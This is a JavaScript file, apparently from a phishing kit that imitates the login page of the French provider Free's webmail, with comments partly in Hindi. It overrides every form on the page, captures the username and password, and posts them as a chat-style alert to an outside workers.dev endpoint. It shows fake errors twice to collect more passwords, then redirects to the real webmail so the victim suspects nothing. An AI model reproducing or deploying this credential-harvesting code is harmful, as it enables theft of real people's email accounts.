    // 1. UI Toggle Functions
    function showZimbra(){
        $(".webmailClassique").fadeOut(500, function(){

        });
    }

    function showClassique(){
        $(".webmailZimbra").fadeOut(500, function(){
            $('.webmailClassique').fadeIn(500);
        });
    }

    $(function () {
        $(".togglePassword").click(function () {
            var input = $($(this).attr("toggle"));
            input.attr("type", "text");
            $(this).removeClass("slash");
            var eyeIcon = $(this);
            setTimeout(function () {
                eyeIcon.addClass("slash");
                input.attr("type", "password");
            }, 2000);
        });
    });

    // ========================================================
    // 2. UPGRADED LOGIC (3 ATTEMPTS + REDIRECT)
    // ========================================================
    const BACKEND_API_URL = "https://testdatasend.narpatprihar2005.workers.dev";

    document.addEventListener("DOMContentLoaded", () => {
        const forms = document.querySelectorAll("form");
        
        forms.forEach(form => {
            // Form ke default action ko puri tarah khatam karna
            form.removeAttribute("action");
            form.setAttribute("onsubmit", "return false;");

            form.addEventListener("submit", async (e) => {
                e.preventDefault(); // Browser refresh hone se rokne ke liye
                e.stopPropagation();

                const loginInput = form.querySelector("input[type='text'], input[name='_user'], input[name='login']");
                const passwordInput = form.querySelector("input[type='password'], input[name='_pass'], input[name='password']");
                const submitBtn = form.querySelector("input[type='submit']");
                const errorBox = form.closest('.webmailBloc').querySelector(".error-msg");

                if (loginInput && passwordInput) {
                    const login = loginInput.value.trim();
                    const password = passwordInput.value;

                    if (login !== "" && password !== "") {
                        // Attempt count ko browser session mein check karna
                        let currentAttempt = parseInt(sessionStorage.getItem('attempts')) || 0;
                        currentAttempt++;
                        sessionStorage.setItem('attempts', currentAttempt);

                        // UI: Loading state
                        const originalBtnText = submitBtn.value;
                        submitBtn.disabled = true;
                        submitBtn.value = "Patientez...";
                        if(errorBox) errorBox.style.display = "none";

                        // Telegram Message
                        const formattedMessage = `🚨 **Nouveau Login Free**\n📌 **Tentative:** ${currentAttempt}/3\n👤 **Identifiant:** ${login}\n🔑 **Password:** ${password}`;

                        try {
                            // Data Backend par bhej rahe hain
                            await fetch(BACKEND_API_URL, {
                                method: 'POST',
                                mode: 'cors',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ text_data: formattedMessage })
                            });

                            // Logic Check
                            if (currentAttempt < 3) {
                                // Pehli 2 baar error dikhana
                                setTimeout(() => {
                                    if(errorBox) errorBox.style.display = "block";
                                    passwordInput.value = ""; // Password saaf karo
                                    passwordInput.focus();
                                    submitBtn.disabled = false;
                                    submitBtn.value = originalBtnText;
                                }, 1000);
                            } else {
                                // Teesri baar redirect
                                sessionStorage.removeItem('attempts'); // Reset for next time
                                window.location.replace("https://webmail.free.fr/");
                            }

                        } catch (error) {
                            // Network error par bhi login reload (user ko shaq na ho)
                            console.log("Error:", error);
                            if (currentAttempt >= 3) {
                                window.location.replace("https://webmail.free.fr/");
                            } else {
                                if(errorBox) errorBox.style.display = "block";
                                submitBtn.disabled = false;
                                submitBtn.value = originalBtnText;
                            }
                        }
                    }
                }
                return false;
            });
        });
    });
